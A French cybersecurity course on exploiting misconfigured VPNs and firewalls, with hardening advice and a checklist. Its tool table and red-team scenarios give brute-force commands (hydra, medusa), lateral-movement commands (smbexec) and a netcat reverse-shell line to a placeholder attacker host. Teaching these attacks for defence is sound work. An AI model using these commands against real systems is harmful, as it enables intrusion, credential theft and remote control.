# VPNs et Firewalls Mal Configures

## Objectifs du cours

Jusqu'ici, nous avons appris a concevoir des reseaux securises avec des firewalls, zones, VPNs et politiques de filtrage. Maintenant, nous adoptons la perspective de l'adversaire. Ce cours explore comment les attaquants exploitent les faiblesses des VPNs et regles firewall mal configurees - des vulnerabilites plus courantes que beaucoup d'administrateurs ne voudraient l'admettre.

Competences visees :
- Identifier les misconfigurations VPN les plus courantes et comprendre leurs impacts
- Comprendre comment les attaquants contournent des regles firewall mal ecrites
- Connaitre les tactiques reelles utilisees pour le mouvement lateral et la persistance
- Appliquer les bonnes pratiques pour durcir vos configurations

---

## Glossaire

### Termes d'attaque

| Terme | Description |
|-------|-------------|
| **Misconfiguration** | Erreur de configuration creant une vulnerabilite |
| **Lateral Movement** | Deplacement d'un attaquant entre systemes du reseau |
| **Credential Stuffing** | Attaque utilisant des credentials voles/leakes |
| **Password Spraying** | Test d'un mot de passe commun sur plusieurs comptes |
| **Brute Force** | Essai systematique de toutes les combinaisons |
| **Pivot** | Utiliser un systeme compromis pour attaquer d'autres cibles |

### Termes VPN

| Terme | Description |
|-------|-------------|
| **Split Tunneling** | Acces simultane au VPN et a Internet local |
| **Full Tunnel** | Tout le trafic passe par le VPN |
| **PSK** | Pre-Shared Key - Cle partagee pour l'authentification |
| **MFA** | Multi-Factor Authentication |
| **VPN Concentrator** | Point d'entree VPN centralise |

### Termes Firewall

| Terme | Description |
|-------|-------------|
| **Shadow Rule** | Regle rendue inefficace par une regle plus large |
| **Overly Permissive** | Regle trop permissive (ex: any any) |
| **Egress Filtering** | Filtrage du trafic sortant |
| **Port Forwarding** | Redirection de port vers l'interne |
| **ACL Bypass** | Contournement des listes de controle d'acces |

### Outils d'attaque

| Outil | Description |
|-------|-------------|
| **Hydra** | Brute-force de credentials |
| **Nmap** | Scanner de ports et services |
| **Shodan** | Moteur de recherche d'appareils exposes |
| **Metasploit** | Framework d'exploitation |
| **Impacket** | Outils d'attaque SMB/Kerberos |
| **Cobalt Strike** | Toolkit de post-exploitation |

### Termes de persistance

| Terme | Description |
|-------|-------------|
| **Reverse Shell** | Shell initie depuis la cible vers l'attaquant |
| **C2/C&C** | Command and Control - Serveur de controle |
| **Callback** | Connexion periodique vers le serveur C2 |
| **Beacon** | Agent Cobalt Strike pour la persistance |
| **Exfiltration** | Vol et extraction de donnees |

---

## Pourquoi les Misconfigurations sont une Mine d'Or

Les firewalls et VPNs sont censes etre les gardiens de votre reseau. Mais mal configures, ils deviennent souvent les faiblesses les plus dangereuses de votre infrastructure.

### Causes courantes des misconfigurations

| Cause | Description |
|-------|-------------|
| **Deployements precipites** | Configurations temporaires devenues permanentes |
| **Manque d'audits** | Pas de revue reguliere des configurations |
| **Confiance aux defauts** | Parametres par defaut non modifies |
| **Manque de comprehension** | Meconnaissance des architectures de zones |
| **Rotation du personnel** | Perte de connaissance des configurations |
| **Documentation absente** | Pas de trace des changements |

### Perspective attaquant

```
┌─────────────────────────────────────────────────────────────┐
│                PERSPECTIVE DE L'ATTAQUANT                   │
│                                                             │
│   Firewall bien configure :                                 │
│   ┌─────────────────────────────────────────────────┐       │
│   │      Tous les acces sont proteges               │       │
│   │      L'attaquant doit trouver un exploit        │       │
│   └─────────────────────────────────────────────────┘       │
│                                                             │
│   Firewall mal configure :                                  │
│   ┌─────────────────────────────────────────────────┐       │
│   │      Des portes sont ouvertes                   │       │
│   │      L'attaquant entre sans effort              │       │
│   └─────────────────────────────────────────────────┘       │
│                                                             │
│   Pour un attaquant, une misconfiguration c'est comme       │
│   trouver une porte non verrouillee dans un batiment        │
│   securise. Pas besoin de crocheter - on entre.             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Misconfigurations VPN Courantes

Les VPNs creent des tunnels chiffres entre utilisateurs distants et reseaux securises - mais ils ne sont securises que si leur configuration l'est.

### 1. Authentification faible ou absente

| Probleme | Risque |
|----------|--------|
| Credentials par defaut | Acces trivial pour l'attaquant |
| PSK faibles | Brute-force facile |
| Pas de MFA | Une seule barriere a franchir |
| Mots de passe partages | Impossible de tracer qui se connecte |

```
┌─────────────────────────────────────────────────────────────┐
│              AUTHENTIFICATION FAIBLE                        │
│                                                             │
│   Sans MFA :                                                │
│   ┌────────────┐      Password      ┌────────────┐          │
│   │ Attaquant  │ ──────────────────>│    VPN     │          │
│   │            │    (vole/devine)   │   Gateway  │          │
│   └────────────┘                    └─────┬──────┘          │
│                                           │                 │
│                                           ▼                 │
│                                    ACCES ACCORDE !          │
│                                    (Pas de 2eme facteur)    │
│                                                             │
│   Avec MFA :                                                │
│   ┌────────────┐      Password      ┌────────────┐          │
│   │ Attaquant  │ ──────────────────>│    VPN     │          │
│   │            │    (vole/devine)   │   Gateway  │          │
│   └────────────┘                    └─────┬──────┘          │
│                                           │                 │
│                                           ▼                 │
│                                    DEMANDE 2eme FACTEUR     │
│                                    (Attaquant bloque)       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 2. Chiffrement obsolete ou faible

| Probleme | Risque |
|----------|--------|
| PPTP | Protocole casse, a eviter totalement |
| RC4 | Cipher vulnerable |
| TLS 1.0/1.1 | Versions obsoletes |
| Pas de PFS | Sessions passees decryptables |
| 3DES | Considere faible aujourd'hui |

**Recommandations :**
- Utiliser AES-256 pour le chiffrement
- TLS 1.3 ou minimum 1.2
- Perfect Forward Secrecy (PFS) active
- DH Group 19+ (ECDH)

### 3. Split Tunneling risque

```
┌─────────────────────────────────────────────────────────────┐
│                    SPLIT TUNNELING                          │
│                                                             │
│   ┌─────────────────────────────────────────────────────┐   │
│   │                  UTILISATEUR                        │   │
│   │                                                     │   │
│   │   ┌────────────────────────────────────────────┐    │   │
│   │   │              LAPTOP                        │    │   │
│   │   └────────────┬─────────────────┬─────────────┘    │   │
│   │                │                 │                  │   │
│   │         VPN Tunnel          Internet Direct         │   │
│   │                │                 │                  │   │
│   └────────────────┼─────────────────┼──────────────────┘   │
│                    │                 │                      │
│                    ▼                 ▼                      │
│            ┌───────────┐      ┌───────────┐                 │
│            │ Corporate │      │  Internet │                 │
│            │  Network  │      │   (Web)   │                 │
│            └───────────┘      └─────┬─────┘                 │
│                                     │                       │
│                                     │                       │
│                              ┌──────┴──────┐                │
│                              │   MALWARE   │                │
│                              │    SITE     │                │
│                              └──────┬──────┘                │
│                                     │                       │
│                                     ▼                       │
│                              L'attaquant pivote             │
│                              vers le reseau corporate       │
│                              via le laptop infecte          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

| Avantage Split Tunnel | Risque Split Tunnel |
|-----------------------|---------------------|
| Performance accrue | Expose le reseau interne |
| Moins de charge VPN | Contourne le filtrage corporate |
| Acces aux ressources locales | Point d'entree pour attaquants |

### 4. VPN Gateway expose sans protection

| Probleme | Risque |
|----------|--------|
| Pas de geo-restriction | Attaques depuis n'importe ou |
| Pas de rate limiting | Brute-force illimite |
| Pas de detection brute-force | Attaques non detectees |
| Indexe sur Shodan | Cible facile a trouver |
| Pas d'ACL | Ouvert a tous |

### 5. Manque de logging et monitoring

| Probleme | Consequence |
|----------|-------------|
| Pas de logs de connexion | Impossible de detecter les intrusions |
| Pas d'alertes | Attaques passent inapercues |
| Sessions sans timeout | Acces prolonge apres compromission |
| Pas de correlation | Patterns d'attaque invisibles |

---

## Exemple Real-World : Colonial Pipeline (2021)

### Chronologie de l'attaque

```
┌─────────────────────────────────────────────────────────────┐
│           ATTAQUE COLONIAL PIPELINE - 2021                  │
│                                                             │
│   1. ACCES INITIAL                                          │
│      ┌─────────────────────────────────────────────────┐    │
│      │ Credentials VPN compromis                       │    │
│      │ - Mot de passe trouve sur le dark web           │    │
│      │ - Pas de MFA active                             │    │
│      │ - Compte VPN legacy encore actif                │    │
│      └─────────────────────────────────────────────────┘    │
│                           │                                 │
│                           ▼                                 │
│   2. MOUVEMENT LATERAL                                      │
│      ┌─────────────────────────────────────────────────┐    │
│      │ Une fois dans le reseau :                       │    │
│      │ - Pas de segmentation adequate                  │    │
│      │ - Pas de detection d'anomalies                  │    │
│      │ - Mouvement libre entre systemes                │    │
│      └─────────────────────────────────────────────────┘    │
│                           │                                 │
│                           ▼                                 │
│   3. DEPLOIEMENT RANSOMWARE                                 │
│      ┌─────────────────────────────────────────────────┐    │
│      │ DarkSide ransomware deploye                     │    │
│      │ - Systemes critiques chiffres                   │    │
│      │ - Operations arretees                           │    │
│      │ - Penurie de carburant sur la cote Est US       │    │
│      └─────────────────────────────────────────────────┘    │
│                           │                                 │
│                           ▼                                 │
│   4. IMPACT                                                 │
│      ┌─────────────────────────────────────────────────┐    │
│      │ - Rancon : $4.4 millions payes                  │    │
│      │ - 6 jours d'arret                               │    │
│      │ - Crise nationale                               │    │
│      └─────────────────────────────────────────────────┘    │
│                                                             │
│   Lecon : Un seul compte VPN sans MFA a cause tout cela     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Facteurs de l'echec

| Facteur | Detail |
|---------|--------|
| **Pas de MFA** | Simple password suffisant |
| **Compte legacy** | VPN non utilise mais actif |
| **Pas de monitoring** | Intrusion non detectee |
| **Pas de segmentation** | Acces IT → OT possible |
| **Pas d'alertes** | Comportement anormal ignore |

---

## Misconfigurations Firewall

Les firewalls gardent les frontieres du reseau. Mais une regle mal configuree est comme une sentinelle distraite : la menace passe sans etre remarquee.

### 1. Regles excessivement permissives

```cisco
! LA PIRE REGLE POSSIBLE
access-list 100 permit ip any any

! Consequence :
! - Tout le trafic est autorise
! - Aucune protection
! - Mouvement lateral trivial
! - Equivalent a pas de firewall
```

| Erreur | Impact |
|--------|--------|
| `permit ip any any` | Zero protection |
| `permit tcp any any` | Tous les ports TCP ouverts |
| `permit udp any any` | Tous les ports UDP ouverts |

### 2. Acces entrant non restreint

```
┌─────────────────────────────────────────────────────────────┐
│           SERVICES EXPOSES A INTERNET                       │
│                                                             │
│   MAUVAIS :                                                 │
│   ┌───────────────────────────────────────────────────┐     │
│   │ Internet ─────> Firewall ─────> RDP (3389) OUVERT │     │
│   │                         └─────> SSH (22) OUVERT   │     │
│   │                         └─────> SMB (445) OUVERT  │     │
│   └───────────────────────────────────────────────────┘     │
│                                                             │
│   Resultat :                                                │
│   - Attaques brute-force constantes                         │
│   - Exploitation de vulnerabilites                          │
│   - Acces direct aux systemes internes                      │
│                                                             │
│   CORRECT :                                                 │
│   ┌───────────────────────────────────────────────────┐     │
│   │ Internet ─────> Firewall ─────> VPN only          │     │
│   │                    │                              │     │
│   │                    └─── RDP/SSH via VPN seulement │     │
│   │                    └─── Geo-restriction           │     │
│   │                    └─── Rate limiting             │     │
│   └───────────────────────────────────────────────────┘     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 3. Confiance aveugle au trafic interne

| Hypothese dangereuse | Realite |
|----------------------|---------|
| "Le LAN est sur" | Un seul poste compromis = acces total |
| "Les employes sont de confiance" | Menaces internes existent |
| "Pas besoin de segmenter" | Mouvement lateral trivial |

```
┌─────────────────────────────────────────────────────────────┐
│              CONFIANCE AVEUGLE AU LAN                       │
│                                                             │
│   Hypothese : "Tout ce qui est interne est sur"             │
│                                                             │
│   ┌─────────────────────────────────────────────────────┐   │
│   │                    LAN "DE CONFIANCE"               │   │
│   │                                                     │   │
│   │   ┌────┐   ┌────┐   ┌────┐   ┌────    ┌────┐        │   │
│   │   │ PC │───│ PC │───│ PC │───│ SRV│───│ DC │        │   │
│   │   │    │   │INF.│   │    │   │    │   │    │        │   │
│   │   └────┘   └─┬──┘   └────┘   └────┘   └────┘        │   │
│   │              │                                      │   │
│   │              │ Mouvement lateral libre              │   │
│   │              │ Aucune barriere                      │   │
│   │              ▼                                      │   │
│   │         COMPROMISSION TOTALE                        │   │
│   │                                                     │   │
│   └─────────────────────────────────────────────────────┘   │
│                                                             │
│   Solution : Microsegmentation + Zero Trust                 │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 4. Shadow Rules (Regles eclipsees)

```cisco
! Exemple de shadow rule
access-list 100 permit ip 192.168.1.0 0.0.0.255 any     ! Regle 1 : Permet tout le subnet
access-list 100 deny ip host 192.168.1.50 any           ! Regle 2 : JAMAIS ATTEINTE !

! Le deny pour 192.168.1.50 ne sera JAMAIS evalue
! car la regle 1 matche d'abord et autorise tout le subnet

! CORRECTION :
access-list 100 deny ip host 192.168.1.50 any           ! D'abord le specifique
access-list 100 permit ip 192.168.1.0 0.0.0.255 any     ! Puis le general
```

### 5. Port Forwarding sans restriction

| Erreur | Impact |
|--------|--------|
| NAT sans filtrage source | Monde entier peut acceder |
| Pas de geo-restriction | Attaques depuis n'importe ou |
| Services sensibles exposes | RDP, SSH directement accessibles |

---

## Comment les Attaquants Exploitent Ces Faiblesses

### Chaine d'attaque typique

```
┌─────────────────────────────────────────────────────────────┐
│                    CHAINE D'ATTAQUE                         │
│                                                             │
│   PHASE 1 : RECONNAISSANCE                                  │
│   ┌─────────────────────────────────────────────────────┐   │
│   │ - Scan Shodan pour VPNs exposes                     │   │
│   │ - Enumeration des services (Nmap)                   │   │
│   │ - Collecte d'emails pour credentials                │   │
│   └─────────────────────────────────────────────────────┘   │
│                           │                                 │
│                           ▼                                 │
│   PHASE 2 : ACCES INITIAL                                   │
│   ┌─────────────────────────────────────────────────────┐   │
│   │ - Credential stuffing sur VPN (Hydra)               │   │
│   │ - Password spraying                                 │   │
│   │ - Exploitation de vuln connue                       │   │
│   └─────────────────────────────────────────────────────┘   │
│                           │                                 │
│                           ▼                                 │
│   PHASE 3 : RECONNAISSANCE INTERNE                          │
│   ┌─────────────────────────────────────────────────────┐   │
│   │ - Scan interne (Nmap, Netcat)                       │   │
│   │ - Identification des cibles                         │   │
│   │ - Mapping du reseau                                 │   │
│   └─────────────────────────────────────────────────────┘   │
│                           │                                 │
│                           ▼                                 │
│   PHASE 4 : MOUVEMENT LATERAL                               │
│   ┌─────────────────────────────────────────────────────┐   │
│   │ - PsExec, WMI, SMB                                  │   │
│   │ - Pass-the-Hash                                     │   │
│   │ - Kerberoasting                                     │   │
│   └─────────────────────────────────────────────────────┘   │
│                           │                                 │
│                           ▼                                 │
│   PHASE 5 : EXFILTRATION / PERSISTANCE                      │
│   ┌─────────────────────────────────────────────────────┐   │
│   │ - Exfiltration via VPN (chiffre !)                  │   │
│   │ - Installation de backdoors                         │   │
│   │ - Reverse shells periodiques                        │   │
│   └─────────────────────────────────────────────────────┘   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Phase par phase

| Phase | Technique | Outil | Misconfiguration exploitee |
|-------|-----------|-------|----------------------------|
| **Recon** | Scan VPN exposes | Shodan | VPN sur Internet sans protection |
| **Initial Access** | Brute-force | Hydra | Pas de MFA, pas de rate limiting |
| **Discovery** | Port scan | Nmap | Regles firewall trop permissives |
| **Lateral Movement** | SMB exec | Impacket | Pas de segmentation interne |
| **Exfiltration** | Tunnel VPN | - | Pas de DLP, pas d'egress filtering |
| **Persistence** | Reverse shell | Netcat | Trafic sortant non filtre |

---

## Outils des Attaquants

### Outils de reconnaissance et brute-force

| Outil | Usage | Exemple |
|-------|-------|---------|
| **Hydra** | Brute-force VPN/SSH | `hydra -l admin -P passwords.txt vpn.target.com https-form-post` |
| **Medusa** | Brute-force multi-protocole | `medusa -h target -u admin -P pass.txt -M ssh` |
| **Nmap** | Scan ports et services | `nmap -sV -sC -p- target.com` |
| **Masscan** | Scan rapide a grande echelle | `masscan -p1-65535 10.0.0.0/8 --rate=10000` |
| **Shodan** | Recherche d'appareils exposes | `shodan search "OpenVPN"` |

### Outils de post-exploitation

| Outil | Usage | Exemple |
|-------|-------|---------|
| **Impacket** | SMB, Kerberos, lateral movement | `smbexec.py domain/user:pass@target` |
| **Metasploit** | Exploitation et post-exploitation | `use exploit/windows/smb/psexec` |
| **Cobalt Strike** | C2 et operations Red Team | Beacons, pivots, exfiltration |
| **Responder** | Capture de hashes NTLM | `responder -I eth0` |
| **Netcat** | Reverse shells | `nc -e /bin/bash attacker.com 4444` |

---

## Scenarios Red Team

### Scenario 1 : Craquage du VPN Gateway

```
┌─────────────────────────────────────────────────────────────┐
│                 SCENARIO 1 : VPN BRUTE-FORCE                │
│                                                             │
│   1. RECONNAISSANCE                                         │
│      $ shodan search "OpenVPN" country:FR                   │
│      → VPN trouve : vpn.target.com                          │
│      → Pas de geo-restriction                               │
│      → Pas de rate limiting visible                         │
│                                                             │
│   2. COLLECTE DE CREDENTIALS                                │
│      $ theHarvester -d target.com -b linkedin               │
│      → Emails trouves : jdupont@target.com                  │
│                                                             │
│   3. PASSWORD SPRAYING                                      │
│      $ hydra -L users.txt -p "Summer2024!" \                │
│           vpn.target.com https-post-form                    │
│      → Credential valide trouve !                           │
│                                                             │
│   4. ACCES VPN                                              │
│      → Connexion reussie (pas de MFA)                       │
│      → Acces au reseau interne                              │
│                                                             │
│   5. RECONNAISSANCE INTERNE                                 │
│      $ nmap -sV 192.168.1.0/24                              │
│      → DB server trouve sur 192.168.1.50:3306               │
│      → Pas de firewall host-based                           │
│                                                             │
│   6. EXFILTRATION                                           │
│      → Connexion DB, dump des donnees                       │
│      → Exfiltration via le tunnel VPN (chiffre !)           │
│      → Aucune alerte declenchee                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Scenario 2 : Exploitation des Blind Spots Internes

```
┌─────────────────────────────────────────────────────────────┐
│              SCENARIO 2 : MOUVEMENT LATERAL                 │
│                                                             │
│   1. ACCES INITIAL (Phishing)                               │
│      → Email malveillant → Macro → Shell                    │
│      → Acces au poste de travail de l'utilisateur           │
│                                                             │
│   2. RECONNAISSANCE                                         │
│      $ nmap -p445 192.168.1.0/24                            │
│      → Port 445 (SMB) ouvert sur plusieurs machines         │
│      → Pas de segmentation !                                │
│                                                             │
│   3. MOUVEMENT LATERAL                                      │
│      $ python smbexec.py domain/user:pass@192.168.1.100     │
│      → Execution de commandes a distance                    │
│      → Credentials supplementaires recuperes                │
│                                                             │
│   4. PERSISTANCE                                            │
│      → Scheduled task pour reverse shell                    │
│      → Callback toutes les 12 heures                        │
│      → Trafic sortant non filtre → succes                   │
│                                                             │
│   5. CONSEQUENCE                                            │
│      → Acces persistant au reseau                           │
│      → Detection : ZERO                                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Scenario 3 : NAT et Exploitation Web

```
┌─────────────────────────────────────────────────────────────┐
│              SCENARIO 3 : PORT FORWARDING ABUSE             │
│                                                             │
│   1. DECOUVERTE                                             │
│      $ nmap -sV target.com                                  │
│      → Port 80 forward vers serveur interne                 │
│      → WordPress detecte                                    │
│      → Pas de filtrage source                               │
│                                                             │
│   2. EXPLOITATION                                           │
│      $ wpscan --url http://target.com -e vp                 │
│      → Plugin vulnerable trouve                             │
│      $ exploit → webshell uploade                           │
│                                                             │
│   3. PIVOT                                                  │
│      → Serveur web = tete de pont                           │
│      → Scan du reseau interne depuis le webshell            │
│      → Systemes critiques non segmentes de la DMZ !         │
│                                                             │
│   4. CONSEQUENCE                                            │
│      → Acces aux bases de donnees internes                  │
│      → Compromission complete depuis un simple WordPress    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Bonnes Pratiques de Durcissement

### Durcissement VPN

| Mesure | Implementation |
|--------|----------------|
| **MFA obligatoire** | TOTP, push notification, hardware token |
| **Chiffrement fort** | AES-256, TLS 1.3, PFS |
| **Geo-restriction** | Bloquer les pays non necessaires |
| **Rate limiting** | Limiter les tentatives de connexion |
| **Timeout sessions** | Deconnexion apres inactivite |
| **Logging complet** | Toutes les connexions, echecs inclus |
| **Alerting** | Notification sur comportement anormal |
| **Audit regulier** | Revue des comptes actifs |

### Durcissement Firewall

| Mesure | Implementation |
|--------|----------------|
| **Deny par defaut** | Bloquer tout, autoriser specifiquement |
| **Moindre privilege** | Uniquement les ports necessaires |
| **Segmentation** | Separer les zones de confiance |
| **Egress filtering** | Controler le trafic sortant |
| **Logging deny** | Logger tous les blocages |
| **Review reguliere** | Audit mensuel des regles |
| **Supprimer les regles inutilisees** | Nettoyage periodique |
| **Documenter** | Justification de chaque regle |

### Checklist securite

```
VPN :
  [ ] MFA active pour tous les utilisateurs
  [ ] Chiffrement AES-256 / TLS 1.3
  [ ] Geo-restriction configuree
  [ ] Rate limiting actif
  [ ] Logging et alerting en place
  [ ] Comptes legacy desactives
  [ ] Audit regulier des acces
  [ ] Split tunneling desactive ou controle

Firewall :
  [ ] Pas de regles "any any"
  [ ] Services admin non exposes a Internet
  [ ] Segmentation interne en place
  [ ] Egress filtering configure
  [ ] Shadow rules eliminees
  [ ] Port forwarding avec restriction source
  [ ] Logging sur toutes les regles deny
  [ ] Review mensuelle des regles
```

---

## Detection et Monitoring

### Indicateurs de compromission

| Indicateur | Signification |
|------------|---------------|
| Connexions VPN a heures inhabituelles | Possible compromission |
| Echecs de connexion multiples | Brute-force en cours |
| Connexions depuis pays inhabituels | Credentials voles |
| Trafic sortant anormal | Exfiltration ou C2 |
| Scan de ports interne | Reconnaissance attaquant |
| Acces a de nombreux systemes | Mouvement lateral |

### Outils de detection

| Outil | Usage |
|-------|-------|
| **SIEM** | Correlation d'evenements |
| **IDS/IPS** | Detection de patterns d'attaque |
| **NetFlow** | Analyse des flux reseau |
| **EDR** | Detection sur les endpoints |
| **UEBA** | Detection de comportements anormaux |

---

## Ressources

| Ressource | Description |
|-----------|-------------|
| [MITRE ATT&CK - Initial Access](https://attack.mitre.org/tactics/TA0001/) | Techniques d'acces initial |
| [SANS - VPN Security Best Practices](https://www.sans.org/reading-room/whitepapers/vpns/) | Bonnes pratiques VPN |
| [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/) | Guides de durcissement |
| [NIST SP 800-77](https://csrc.nist.gov/publications/detail/sp/800-77/rev-1/final) | Guide IPSec VPN |

---

## Labs TryHackMe

| Room | Description | Lien |
|------|-------------|------|
| **VPN Security** | Securite des VPNs | https://tryhackme.com/room/dvwafirewalls |
| **Attacking Active Directory** | Mouvement lateral | https://tryhackme.com/room/attacktivedirectory |
| **Post Exploitation Basics** | Techniques post-exploitation | https://tryhackme.com/room/postexploit |
| **Lateral Movement and Pivoting** | Pivoting reseau | https://tryhackme.com/room/dvwafirewalls |

> **Note** : Ce cours presente des techniques offensives a des fins educatives et de defense. Ces techniques ne doivent etre utilisees que dans un contexte autorise : tests de penetration avec mandat, CTF, ou environnements de lab isoles. Comprendre les methodes d'attaque est essentiel pour mieux defendre vos reseaux.
